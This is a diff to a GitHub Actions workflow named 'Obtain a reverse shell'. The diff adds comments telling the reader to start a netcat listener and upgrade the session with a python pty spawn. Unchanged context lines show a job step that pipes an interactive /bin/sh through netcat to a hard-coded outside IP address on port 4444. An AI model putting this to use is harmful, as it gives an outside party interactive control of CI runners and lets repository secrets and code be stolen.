@@ -1,5 +1,9 @@
 name: Obtain a reverse shell
 
+# run       "  nc -nlvp 4444  "     on host
+# after obtaining reverse shell, upgrade it to tty using the command    
+#            "  python -c 'import pty; pty.spawn("/bin/bash")'  "
+
 on: 
   workflow_dispatch:
   
@@ -22,3 +26,4 @@ jobs:
       - name: cat - Get the shell
         run: |
           cat /tmp/f | /bin/sh -i 2>&1 | nc 54.221.74.225 4444 > /tmp/f
+
